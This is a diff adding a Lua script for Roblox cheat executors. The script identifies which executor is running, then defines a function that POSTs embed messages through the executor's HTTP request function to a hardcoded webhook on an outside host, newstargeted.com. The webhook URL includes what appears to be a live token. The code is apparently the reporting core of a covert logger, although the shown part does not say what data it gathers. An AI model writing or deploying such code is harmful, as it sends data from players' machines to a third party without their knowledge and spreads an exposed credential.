@@ -1,0 +1,32 @@
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url = "https://webhook.newstargeted.com/api/webhooks/1561047468983062578/XyD0Zy7POJBuR91g_CNd-1BzZDKlbGIHFmLrycRlr0ji9aJgPf3xDBqeP92lAkqpzY3M"
+local headers = {
+   ["content-type"] = "application/json"
+}
+
+local function SendMessage(message, fields)
+    local data = {
+    	['content'] = "",
+    	['embeds'] = {{
+    		["image"] = {["url"] = "https://media.discordapp.net/attachments/1120088132168192020/1207049352237944903/IMG_20240213_214228.jpg?ex=65de3b4f&is=65cbc64f&hm=c3d45882b4c0c838d7ce27a647259c69c5ef04853be4861f921721bf67ffb88f&=&format=webp"},
+    		['description'] = "# "..message.."",
+    		['type'] = "rich",
+    		["color"] = tonumber(0xffffff),
+    		['fields'] = fields
+
+    	},
+    	},
+    }
+
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+end
